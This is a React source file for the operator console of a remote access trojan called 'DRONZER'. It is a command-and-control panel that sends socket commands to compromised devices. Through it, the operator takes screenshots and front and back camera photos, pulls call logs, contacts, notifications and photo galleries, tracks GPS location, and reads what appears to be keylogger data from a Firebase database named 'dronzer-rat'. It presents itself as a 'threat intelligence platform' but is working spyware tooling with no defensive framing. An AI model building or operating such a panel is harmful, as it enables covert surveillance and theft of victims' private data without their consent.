import React, { useState, useEffect, useRef } from 'react';
import { io, Socket } from 'socket.io-client';
import { motion, AnimatePresence } from 'motion/react';
import { Terminal, Shield, Cpu, Activity, Globe, Image as ImageIcon, Video, X, Maximize, Minus, Info, PhoneCall, Users, Bell, Settings, Database, ChevronRight, ChevronDown } from 'lucide-react';
import { initializeApp } from 'firebase/app';
import { getDatabase, ref, onValue } from 'firebase/database';
import { clsx, type ClassValue } from 'clsx';
import { twMerge } from 'tailwind-merge';
import HexBackground from './HexBackground';
import HoloGlobe from './HoloGlobe';
import { TerminalOverlay } from './TerminalOverlay';
import { HudFrame } from './HudFrame';

function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs));
}

function TreeItem({ label, value, themeColor, level }: { label: string, value: any, themeColor: string, level: number }) {
  const isObject = typeof value === 'object' && value !== null;
  const [isOpen, setIsOpen] = useState(level < 1);

  return (
    <div className="flex flex-col">
      <div 
        className={cn("flex items-center gap-2 cursor-pointer hover:bg-white/5 transition-colors py-0.5", !isObject && "cursor-default hover:bg-transparent")}
        onClick={() => isObject && setIsOpen(!isOpen)}
      >
        {isObject ? (
          isOpen ? <ChevronDown className="w-3 h-3 text-cyan-500" /> : <ChevronRight className="w-3 h-3 text-cyan-500" />
        ) : (
          <div className="w-3 h-3" />
        )}
        <span className="text-cyan-500/70 font-bold">{label}:</span>
        {!isObject && <TreeView data={value} themeColor={themeColor} level={level + 1} />}
      </div>
      {isObject && isOpen && (
        <TreeView data={value} themeColor={themeColor} level={level + 1} />
      )}
    </div>
  );
}

function TreeView({ data, themeColor, level = 0 }: { data: any, themeColor: string, level?: number }) {
  if (data === null || data === undefined) return <span className="opacity-30">NULL</span>;
  
  if (typeof data !== 'object') {
    return <span className="text-white/80">{String(data)}</span>;
  }

  return (
    <div className={cn("flex flex-col gap-4", level > 0 && "ml-10 border-l border-white/10 pl-10")}>
      {Object.entries(data).map(([key, value]) => (
        <TreeItem key={key} label={key} value={value} themeColor={themeColor} level={level} />
      ))}
    </div>
  );
}

export default function TerminalApp({ onClose }: { onClose?: () => void }) {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loginError, setLoginError] = useState('');

  const [socket, setSocket] = useState<Socket | null>(null);
  const [status, setStatus] = useState({ text: 'DISCORD OFFLINE', color: '#ff3333' });
  const [logs, setLogs] = useState<string[]>([]);
  const [activeTab, setActiveTab] = useState('INFO');
  const [command, setCommand] = useState('');
  
  // Data States
  const [profiles, setProfiles] = useState<{ user: any, bot: any }>({ user: null, bot: null });
  const [devices, setDevices] = useState<any[]>([]);
  const [callLogs, setCallLogs] = useState<any[]>([]);
  const [contacts, setContacts] = useState<any[]>([]);
  const [notifs, setNotifs] = useState<any[]>([]);
  const [gallery, setGallery] = useState<{ [key: string]: string[] }>({});
  const [images, setImages] = useState<{ url: string, type: string }[]>([]);
  const [sysInfo, setSysInfo] = useState<string[]>([]);
  const [location, setLocation] = useState({ lat: 0, lon: 0 });
  const [locationMeta, setLocationMeta] = useState<any>({});
  const [rtklData, setRtklData] = useState<any>(null);
  
  // Theme States
  const [themeColor, setThemeColor] = useState({ r: 0, g: 255, b: 255 });
  const [isRgbFlow, setIsRgbFlow] = useState(false);
  const [heavyGlitch, setHeavyGlitch] = useState(false);
  const [rgbBreathing, setRgbBreathing] = useState(false);

  const [selectedClient, setSelectedClient] = useState<string | null>(null);
  const [galleryCategory, setGalleryCategory] = useState<string | null>(null);

  const logsEndRef = useRef<HTMLDivElement>(null);
  const [windowSize, setWindowSize] = useState({ width: typeof window !== 'undefined' ? window.innerWidth : 1200, height: typeof window !== 'undefined' ? window.innerHeight : 800 });

  useEffect(() => {
    const handleResize = () => {
      const w = window.innerWidth;
      const h = window.innerHeight;
      setWindowSize({ width: w, height: h });
    };
    handleResize();
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  useEffect(() => {
    const newSocket = io();
    setSocket(newSocket);

    newSocket.on('status', (data) => {
      if (data) setStatus(data);
    });
    newSocket.on('log', (msg) => {
      setLogs((prev) => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);
      
      // Attempt to parse device info from logs if backend sends it this way
      if (typeof msg === 'string' && msg.toLowerCase().includes('device')) {
        try {
          if (msg.includes('{') && msg.includes('}')) {
            const jsonStr = msg.substring(msg.indexOf('{'), msg.lastIndexOf('}') + 1);
            const data = JSON.parse(jsonStr);
            if (data.id) {
              setDevices(prev => {
                const idx = prev.findIndex(d => d.id === data.id);
                if (idx >= 0) {
                  const newD = [...prev];
                  newD[idx] = data;
                  return newD;
                }
                return [...prev, data];
              });
            }
          }
        } catch (e) {
          // Ignore parse errors
        }
      }
    });
    
    newSocket.on('profile', (data) => {
      if (!data || !data.type) return;
      setProfiles(prev => ({ ...prev, [data.type]: data }));
    });

    newSocket.on('device', (data) => {
      if (!data || !data.id) return;
      setDevices(prev => {
        const idx = prev.findIndex(d => d.id === data.id);
        if (idx >= 0) {
          const newD = [...prev];
          newD[idx] = data;
          return newD;
        }
        return [...prev, data];
      });
    });

    newSocket.on('devices', (data) => {
      if (Array.isArray(data)) {
        setDevices(data);
      }
    });

    newSocket.on('call_log', (data) => setCallLogs(prev => [...prev, data]));
    newSocket.on('contact', (data) => setContacts(prev => [...prev, data]));
    newSocket.on('notif', (data) => setNotifs(prev => [...prev, data]));
    
    newSocket.on('gallery', (data) => {
      if (!data || !data.category) return;
      setGallery(prev => {
        const cat = prev[data.category] || [];
        if (!cat.includes(data.path)) {
          return { ...prev, [data.category]: [...cat, data.path] };
        }
        return prev;
      });
    });

    newSocket.on('image', (data) => {
      if (data && data.url) setImages((prev) => [data, ...prev]);
    });
    newSocket.on('sys_info', (data) => setSysInfo(prev => [...prev, data]));
    newSocket.on('location', (data) => setLocation(data));
    newSocket.on('location_meta', (data) => setLocationMeta((prev: any) => ({ ...prev, ...data })));

    // Firebase RTDB Setup for RTKL
    const firebaseConfig = {
      databaseURL: "https://dronzer-rat-default-rtdb.asia-southeast1.firebasedatabase.app/"
    };
    const fbApp = initializeApp(firebaseConfig, 'rtkl-app');
    const db = getDatabase(fbApp);
    const rtklRef = ref(db, '/');
    
    const unsubscribeRtkl = onValue(rtklRef, (snapshot) => {
      const data = snapshot.val();
      setRtklData(data);
    });

    return () => { 
      newSocket.disconnect(); 
      unsubscribeRtkl();
    };
  }, []);

  useEffect(() => {
    logsEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  const sendCommand = (cmd: string) => {
    if (!cmd.trim() || !socket) return;
    if (cmd === 'clear') {
      setLogs([]);
    } else {
      if (cmd.startsWith('!devices')) {
        setDevices([]);
      }
      if (cmd.startsWith('!info')) {
        setSysInfo([]);
      }
      socket.emit('command', cmd);
    }
  };

  const handleCommandSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    sendCommand(command);
    setCommand('');
  };

  const themeHex = `rgb(${themeColor.r}, ${themeColor.g}, ${themeColor.b})`;
  const themeStyle = { 
    color: isRgbFlow ? '#fff' : themeHex,
    '--theme-color': themeHex,
    '--theme-color-hover': `rgb(${Math.min(255, themeColor.r + 50)}, ${Math.min(255, themeColor.g + 50)}, ${Math.min(255, themeColor.b + 50)})`
  } as React.CSSProperties;

  const tabs = [
    { id: 'INFO', icon: Info, label: 'INFO' },
    { id: 'ABOUT', icon: Shield, label: 'ABOUT ME' },
    { id: 'DEVICES', icon: Cpu, label: 'DEVICES' },
    { id: 'CALL LOGS', icon: PhoneCall, label: 'CALL LOGS' },
    { id: 'CONTACTS', icon: Users, label: 'CONTACTS' },
    { id: 'NOTIFS', icon: Bell, label: 'NOTIFS' },
    { id: 'GALLERY', icon: ImageIcon, label: 'GALLERY' },
    { id: 'MEDIA', icon: Video, label: 'MEDIA VIEW' },
    { id: 'SYSINFO', icon: Activity, label: 'SYS INFO' },
    { id: 'LOCATION', icon: Globe, label: 'LOCATION' },
    { id: 'RTKL', icon: Database, label: 'RTKL' },
    { id: 'THEME', icon: Settings, label: 'THEME' },
    { id: 'LOGS', icon: Terminal, label: 'LOGS' },
  ];

  return (
    <div className={cn("h-screen h-[100dvh] bg-black font-mono flex flex-col relative overflow-hidden", rgbBreathing && "rgb-breathing")} style={themeStyle}>
      <HexBackground color={themeHex} isRgbFlow={isRgbFlow} clearRadius={2000} />
      <div className="absolute inset-0 pointer-events-none bg-[linear-gradient(transparent_50%,rgba(0,0,0,0.25)_50%)] bg-[length:100%_4px] z-30 opacity-20"></div>
      
      <TerminalOverlay color={themeHex} heavyGlitch={heavyGlitch} rgbBorders={isRgbFlow} />

      <div className="absolute inset-0 z-40 flex flex-col pointer-events-none" style={{
        top: '17.1875%',
        bottom: '14.84375%',
        left: '5%',
        right: '5%',
        padding: '2rem'
      }}>
        <div className="flex-1 flex flex-col pointer-events-auto overflow-hidden">
          {/* Header */}
          <header className="flex items-center justify-between bg-black/40 backdrop-blur-md relative z-40 px-12 py-6">
            <div className="flex items-center gap-4">
              <div className="flex items-center gap-2">
                <div className={cn("w-3 h-3 rounded-full animate-pulse", status.color === '#4ade80' ? 'bg-green-500' : 'bg-red-500')} />
                <span style={{ color: status.color }} className="font-bold text-sm tracking-wider">{status.text}</span>
              </div>
            </div>
            
            <div className="absolute left-1/2 -translate-x-1/2">
              <h1 className="text-2xl font-bold tracking-[0.3em]" style={{ color: themeHex, textShadow: `0 0 10px ${themeHex}` }}>DRONZER</h1>
            </div>

            <div className="flex gap-2">
              <button className="p-2 hover:bg-white/10 transition-colors" style={{ color: themeHex }}><Minus className="w-4 h-4" /></button>
              <button className="p-2 hover:bg-white/10 transition-colors" style={{ color: themeHex }}><Maximize className="w-4 h-4" /></button>
              {onClose && (
                <button onClick={onClose} className="p-2 hover:bg-red-900/50 hover:text-red-400 transition-colors" style={{ color: themeHex }}><X className="w-4 h-4" /></button>
              )}
            </div>
          </header>

          {/* Main Content */}
          <main className="flex-1 flex overflow-hidden relative z-30 p-0 flex-row">
            {/* Sidebar Tabs */}
            <aside className="bg-black/30 flex gap-2 border-white/5 w-56 flex-col p-6 overflow-y-auto border-r">
              {tabs.map((tab) => {
                const Icon = tab.icon;
                const isActive = activeTab === tab.id;
                return (
                  <button
                    key={tab.id}
                    onClick={() => setActiveTab(tab.id)}
                    className={cn(
                      "flex items-center gap-3 font-bold tracking-widest transition-all duration-200 shrink-0 px-5 py-3 text-[11px]",
                      isActive ? "bg-white/10 shadow-[inset_0_0_20px_rgba(255,255,255,0.05)]" : "hover:bg-white/5"
                    )}
                    style={{ color: isActive ? themeHex : '#666' }}
                  >
                    <Icon className="w-3.5 h-3.5" />
                    {tab.label}
                  </button>
                );
              })}
            </aside>

            {/* Content Area */}
            <section className="flex-1 flex flex-col relative overflow-hidden bg-black/20">
              <div className="flex-1 overflow-y-auto custom-scrollbar p-12">
                <AnimatePresence mode="wait">
                  
                  {activeTab === 'INFO' && (
                    <motion.div key="info" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="h-full flex flex-col gap-4 overflow-y-auto pr-2 custom-scrollbar">
                      {['user', 'bot'].map(type => {
                        const p = profiles[type as 'user' | 'bot'];
                        return (
                          <div key={type} className="border bg-black/40 relative overflow-hidden group shrink-0 p-8" style={{ borderColor: type === 'user' ? '#ff3333' : '#4ade80' }}>
                            <div className="absolute top-0 right-0 w-16 h-16 opacity-5 pointer-events-none">
                              <Shield className="w-full h-full" style={{ color: type === 'user' ? '#ff3333' : '#4ade80' }} />
                            </div>
                            <h3 className="font-bold mb-3 flex items-center gap-2 text-[10px] tracking-widest" style={{ color: type === 'user' ? '#ff3333' : '#4ade80' }}>
                              <div className="w-1.5 h-1.5 rounded-full animate-pulse" style={{ backgroundColor: type === 'user' ? '#ff3333' : '#4ade80' }} />
                              {type.toUpperCase()} IDENTITY_ENCLAVE
                            </h3>
                            <div className="flex gap-4 flex-row">
                              <div className="flex-1 whitespace-pre-wrap text-[11px] font-mono leading-relaxed" style={{ color: type === 'user' ? '#ffaaaa' : '#aaffaa' }}>
                                {p ? p.info : 'Waiting for activity...'}
                              </div>
                              <div className="flex gap-2">
                                {p?.banner && <img src={p.banner} alt="banner" className="w-32 h-16 object-cover border border-dashed opacity-30 hover:opacity-100 transition-opacity" style={{ borderColor: type === 'user' ? '#ff3333' : '#4ade80' }} />}
                                {p?.avatar ? <img src={p.avatar} alt="avatar" className="w-16 h-16 object-cover border-2 shadow-[0_0_15px_rgba(0,0,0,0.5)]" style={{ borderColor: type === 'user' ? '#ff3333' : '#4ade80' }} /> : <div className="w-16 h-16 border-2 flex items-center justify-center text-[8px] text-center p-1" style={{ borderColor: type === 'user' ? '#ff3333' : '#4ade80' }}>NO_DATA</div>}
                              </div>
                            </div>
                          </div>
                        );
                      })}
                    </motion.div>
                  )}

                  {activeTab === 'ABOUT' && (
                    <motion.div key="about" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="h-full flex flex-col overflow-y-auto pr-2 custom-scrollbar">
                      <div className="border p-6 bg-black/60 backdrop-blur-md relative overflow-hidden" style={{ borderColor: themeHex }}>
                        <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-cyan-500 to-transparent opacity-30"></div>
                        <h2 className="text-xl font-bold tracking-[0.3em] mb-4" style={{ color: themeHex }}>DRONZER_OS // ABOUT_ME</h2>
                        <div className="space-y-4 text-xs leading-relaxed opacity-80" style={{ color: themeHex }}>
                          <p>Welcome to the Dronzer Advanced Threat Intelligence Platform. This system is designed for high-precision reconnaissance and digital perimeter monitoring.</p>
                          <div className="grid grid-cols-2 gap-4">
                            <div className="space-y-3">
                              <h3 className="font-bold tracking-widest border-b pb-1 text-[10px]" style={{ borderColor: `${themeHex}44` }}>SYSTEM_SPECS</h3>
                              <ul className="space-y-1 font-mono text-[10px]">
                                <li>&gt; ARCH: NEURAL_LINK_V4</li>
                                <li>&gt; ENCRYPTION: AES-4096-Q</li>
                                <li>&gt; LATENCY: &lt; 0.001ms</li>
                                <li>&gt; STATUS: OPERATIONAL</li>
                              </ul>
                            </div>
                            <div className="space-y-3">
                              <h3 className="font-bold tracking-widest border-b pb-1 text-[10px]" style={{ borderColor: `${themeHex}44` }}>OPERATOR_INFO</h3>
                              <ul className="space-y-1 font-mono text-[10px]">
                                <li>&gt; IDENTITY: DRONZER_PRIME</li>
                                <li>&gt; CLEARANCE: LEVEL_9</li>
                                <li>&gt; LOCATION: CLASSIFIED</li>
                                <li>&gt; UPTIME: 99.999%</li>
                              </ul>
                            </div>
                          </div>
                          <p className="mt-4 pt-4 border-t text-[9px] tracking-[0.2em] italic" style={{ borderColor: `${themeHex}22` }}>
                            "In the realm of digital shadows, visibility is the only weapon."
                          </p>
                        </div>
                      </div>
                    </motion.div>
                  )}

                  {activeTab === 'DEVICES' && (
                    <motion.div key="devices" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="h-full flex flex-col">
                      <div className="flex justify-between items-center mb-6">
                        <h2 className="text-xl font-bold tracking-widest">DISCOVERED TARGET LINKS</h2>
                        <button onClick={() => sendCommand('!devices')} className="px-6 py-2 border bg-black/50 hover:bg-white/10 transition-colors text-xs" style={{ borderColor: themeHex }}>SCAN DEVICES</button>
                      </div>
                      <div className="border bg-black/50 flex-1 overflow-auto" style={{ borderColor: themeHex }}>
                        <table className="w-full text-left border-collapse text-sm">
                          <thead>
                            <tr className="border-b bg-white/5" style={{ borderColor: themeHex }}>
                              <th className="p-3 font-normal">Device Name</th>
                              <th className="p-3 font-normal table-cell">Device ID</th>
                              <th className="p-3 font-normal">Last Seen</th>
                              <th className="p-3 font-normal">Action</th>
                            </tr>
                          </thead>
                          <tbody>
                            {devices.map((d, i) => (
                              <tr key={i} className="border-b hover:bg-white/5 transition-colors" style={{ borderColor: themeHex }}>
                                <td className="p-3">{d?.name}</td>
                                <td className="p-3 table-cell">{d?.id}</td>
                                <td className="p-3">{d?.lastSeen}</td>
                                <td className="p-3">
                                  <button 
                                    onClick={() => {
                                      if (!d?.id) return;
                                      setSelectedClient(d.id);
                                      sendCommand(`!switch ${d.id}`);
                                      sendCommand(`!select ${d.id}`);
                                    }}
                                    className={cn("px-2 py-1 border text-xs transition-colors", selectedClient === d?.id ? "border-green-500 text-green-500 bg-green-950/30" : "hover:bg-white/10")}
                                    style={{ borderColor: selectedClient === d?.id ? '#22c55e' : themeHex }}
                                  >
                                    {selectedClient === d?.id ? 'LOCKED' : 'LOCK'}
                                  </button>
                                </td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                    </motion.div>
                  )}

                  {['CALL LOGS', 'CONTACTS', 'NOTIFS'].includes(activeTab) && (
                    <motion.div key={activeTab} initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="h-full flex flex-col">
                      <div className="flex justify-between items-center mb-6">
                        <h2 className="text-xl font-bold tracking-widest">{activeTab}</h2>
                        <button onClick={() => sendCommand(`!${activeTab.toLowerCase().replace(' ', '')}`)} className="px-6 py-2 border bg-black/50 hover:bg-white/10 transition-colors" style={{ borderColor: themeHex }}>FETCH {activeTab}</button>
                      </div>
                      <div className="border bg-black/50 flex-1 overflow-auto" style={{ borderColor: themeHex }}>
                        <table className="w-full text-left border-collapse text-sm">
                          <tbody>
                            {(activeTab === 'CALL LOGS' ? callLogs : activeTab === 'CONTACTS' ? contacts : notifs).map((row, i) => (
                              <tr key={i} className="border-b hover:bg-white/5 transition-colors" style={{ borderColor: themeHex }}>
                                {Array.isArray(row) ? (
                                  row.map((cell: any, j: number) => <td key={j} className="p-2">{String(cell)}</td>)
                                ) : typeof row === 'object' && row !== null ? (
                                  Object.values(row).map((cell: any, j: number) => <td key={j} className="p-2">{String(cell)}</td>)
                                ) : (
                                  <td className="p-2">{String(row)}</td>
                                )}
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                    </motion.div>
                  )}

                  {activeTab === 'GALLERY' && (
                    <motion.div key="gallery" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="h-full flex gap-4">
                      <div className="w-48 flex flex-col gap-4">
                        <button onClick={() => sendCommand('!gallery')} className="px-4 py-2 border bg-black/50 hover:bg-white/10 transition-colors" style={{ borderColor: themeHex }}>SCAN DEVICE</button>
                        <div className="flex-1 border bg-black/50 overflow-y-auto" style={{ borderColor: themeHex }}>
                          {Object.keys(gallery).map(cat => (
                            <div key={cat} onClick={() => setGalleryCategory(cat)} className={cn("p-2 cursor-pointer border-b hover:bg-white/10", galleryCategory === cat ? "bg-white/20" : "")} style={{ borderColor: themeHex }}>{cat}</div>
                          ))}
                        </div>
                      </div>
                      <div className="flex-1 border bg-black/50 p-4 overflow-y-auto grid grid-cols-4 gap-4" style={{ borderColor: themeHex }}>
                        {galleryCategory && gallery[galleryCategory]?.map((path, i) => (
                          <button key={i} onClick={() => sendCommand(`!getimg ${path}`)} className="h-24 border flex items-center justify-center hover:bg-white/10" style={{ borderColor: themeHex }}>
                            VIEW IMG
                          </button>
                        ))}
                      </div>
                    </motion.div>
                  )}

                  {activeTab === 'MEDIA' && (
                    <motion.div key="media" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="h-full flex flex-col">
                      <div className="flex gap-4 mb-6">
                        <button onClick={() => sendCommand('!ss')} className="px-4 py-2 border bg-black/50 hover:bg-white/10 transition-colors text-sm" style={{ borderColor: themeHex }}>Screenshot</button>
                        <button onClick={() => sendCommand('!c1')} className="px-4 py-2 border bg-black/50 hover:bg-white/10 transition-colors text-sm" style={{ borderColor: themeHex }}>Front Photo</button>
                        <button onClick={() => sendCommand('!c2')} className="px-4 py-2 border bg-black/50 hover:bg-white/10 transition-colors text-sm" style={{ borderColor: themeHex }}>Back Photo</button>
                      </div>
                      <div className="flex-1 border bg-black/50 flex items-center justify-center overflow-hidden relative" style={{ borderColor: themeHex }}>
                        {images.length > 0 ? (
                          <div className="grid grid-cols-2 md:grid-cols-3 gap-4 p-4 w-full h-full overflow-y-auto">
                            {images.map((img, i) => (
                              <div key={i} className="relative group border aspect-video bg-black" style={{ borderColor: themeHex }}>
                                <img src={img?.url} alt={`Capture ${i}`} className="w-full h-full object-contain" />
                                <div className="absolute top-2 right-2 bg-black/80 px-2 py-1 text-xs border" style={{ borderColor: themeHex }}>{img?.type}</div>
                              </div>
                            ))}
                          </div>
                        ) : (
                          <div className="tracking-widest flex flex-col items-center gap-4 opacity-50">
                            <ImageIcon className="w-12 h-12" />
                            <span>AWAITING SNAPSHOT...</span>
                          </div>
                        )}
                      </div>
                    </motion.div>
                  )}

                  {activeTab === 'LOCATION' && (
                    <motion.div key="location" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="h-full flex gap-6 flex-row">
                      <div className="flex flex-col gap-4 w-1/3">
                        <h2 className="text-xl font-bold tracking-widest mb-2">GEO TRACKING</h2>
                        <button onClick={() => sendCommand('!location')} className="px-6 py-3 border bg-black/50 hover:bg-white/10 transition-colors w-full text-left text-xs" style={{ borderColor: themeHex }}>FETCH GPS LOCATION</button>
                        <div className="flex-1 border bg-black/50 p-4 text-sm whitespace-pre-wrap" style={{ borderColor: themeHex }}>
                          {`LAT: ${location?.lat || 0}\nLON: ${location?.lon || 0}\nCITY: ${locationMeta?.city || 'Unknown'}\nAREA: ${locationMeta?.area || 'Unknown'}\nMAPS: ${locationMeta?.mapsUrl || 'N/A'}`}
                        </div>
                      </div>
                      <div className="border bg-black/50 relative overflow-hidden flex-1" style={{ borderColor: themeHex }}>
                        <HoloGlobe lat={location?.lat || 0} lon={location?.lon || 0} color={themeHex} />
                      </div>
                    </motion.div>
                  )}

                  {activeTab === 'RTKL' && (
                    <motion.div key="rtkl" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="h-full flex flex-col">
                      <div className="flex justify-between items-center mb-6">
                        <h2 className="text-xl font-bold tracking-widest">REAL-TIME KERNEL LOGS (RTKL)</h2>
                        <div className="text-[10px] text-cyan-500/50 tracking-widest">SOURCE: FIREBASE_RTDB</div>
                      </div>
                      <div className="flex-1 border bg-black/50 p-5 overflow-y-auto font-mono text-sm" style={{ borderColor: themeHex }}>
                        {rtklData ? (
                          <div className="space-y-4">
                            {Object.entries(rtklData).map(([deviceId, data]) => (
                              <div key={deviceId} className="border border-white/10 bg-white/5 p-4 rounded">
                                <div className="flex items-center gap-2 text-cyan-500 font-bold mb-3 border-b border-cyan-500/20 pb-2">
                                  <Cpu className="w-4 h-4" />
                                  DEVICE_ID: {deviceId}
                                </div>
                                <TreeView data={data} themeColor={themeHex} />
                              </div>
                            ))}
                          </div>
                        ) : (
                          <div className="h-full flex flex-col items-center justify-center opacity-30 gap-4">
                            <Database className="w-12 h-12 animate-pulse" />
                            <span className="tracking-[0.3em]">SYNCHRONIZING_WITH_RTDB...</span>
                          </div>
                        )}
                      </div>
                    </motion.div>
                  )}

                  {activeTab === 'SYSINFO' && (
                    <motion.div key="sysinfo" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="h-full flex flex-col">
                      <div className="flex justify-between items-center mb-6">
                        <h2 className="text-xl font-bold tracking-widest">SYSTEM INFORMATION</h2>
                        <button onClick={() => sendCommand('!info')} className="px-6 py-2 border bg-black/50 hover:bg-white/10 transition-colors" style={{ borderColor: themeHex }}>FETCH SYS INFO</button>
                      </div>
                      <div className="flex-1 border bg-black/50 p-6 overflow-y-auto font-mono text-sm whitespace-pre-wrap" style={{ borderColor: themeHex }}>
                        {sysInfo.join('\n') || 'No system information available. Run fetch command.'}
                      </div>
                    </motion.div>
                  )}

                  {activeTab === 'THEME' && (
                    <motion.div key="theme" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="h-full flex flex-col gap-6 max-w-2xl">
                      <div className="border p-6 bg-black/50" style={{ borderColor: themeHex }}>
                        <h3 className="font-bold mb-4">TERMINAL CUSTOM COLOR</h3>
                        <div className="space-y-4">
                          {['r', 'g', 'b'].map(c => (
                            <div key={c} className="flex items-center gap-4">
                              <span className="w-4 uppercase">{c}:</span>
                              <input type="range" min="0" max="255" value={(themeColor as any)[c]} onChange={(e) => setThemeColor(prev => ({ ...prev, [c]: parseInt(e.target.value) || 0 }))} className="flex-1" disabled={isRgbFlow} />
                              <span className="w-8 text-right">{(themeColor as any)[c]}</span>
                            </div>
                          ))}
                        </div>
                      </div>
                      <div className="border p-6 bg-black/50" style={{ borderColor: themeHex }}>
                        <h3 className="font-bold mb-4">DYNAMIC EFFECTS</h3>
                        <div className="space-y-4">
                          <label className="flex items-center gap-3 cursor-pointer">
                            <input type="checkbox" checked={isRgbFlow} onChange={(e) => setIsRgbFlow(e.target.checked)} className="w-4 h-4" />
                            <span>Enable RGB Terminal Borders</span>
                          </label>
                          <label className="flex items-center gap-3 cursor-pointer">
                            <input type="checkbox" checked={heavyGlitch} onChange={(e) => setHeavyGlitch(e.target.checked)} className="w-4 h-4" />
                            <span>Enable Heavy Glitch (Greebles)</span>
                          </label>
                          <label className="flex items-center gap-3 cursor-pointer">
                            <input type="checkbox" checked={rgbBreathing} onChange={(e) => setRgbBreathing(e.target.checked)} className="w-4 h-4" />
                            <span>Enable RGB Breathing</span>
                          </label>
                        </div>
                      </div>
                    </motion.div>
                  )}

                  {activeTab === 'LOGS' && (
                    <motion.div key="logs" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="h-full flex flex-col">
                      <div className="flex-1 overflow-y-auto font-mono text-sm space-y-1 pb-4">
                        {logs.map((log, i) => (
                          <div key={i} className="break-all">
                            {log.startsWith('>') ? (
                              <span style={{ color: themeHex, opacity: 0.8 }}>{log}</span>
                            ) : log.includes('[!]') || log.includes('Error') ? (
                              <span className="text-red-400">{log}</span>
                            ) : log.includes('[*]') ? (
                              <span className="text-green-400">{log}</span>
                            ) : (
                              <span style={{ color: themeHex }}>{log}</span>
                            )}
                          </div>
                        ))}
                        <div ref={logsEndRef} />
                      </div>
                    </motion.div>
                  )}

                </AnimatePresence>
              </div>

              {/* Terminal Input */}
              <div className="bg-black/60 backdrop-blur-md px-12 py-8">
                <form onSubmit={handleCommandSubmit} className="flex items-center gap-2">
                  <span className="font-bold text-sm" style={{ color: themeHex }}># dronzer@root:</span>
                  <input
                    type="text"
                    value={command}
                    onChange={(e) => setCommand(e.target.value)}
                    className="flex-1 bg-transparent border-none outline-none text-sm"
                    style={{ color: themeHex }}
                    placeholder="Enter command..."
                    autoFocus
                  />
                </form>
              </div>
            </section>
          </main>
        </div>
      </div>
    </div>
  );
}
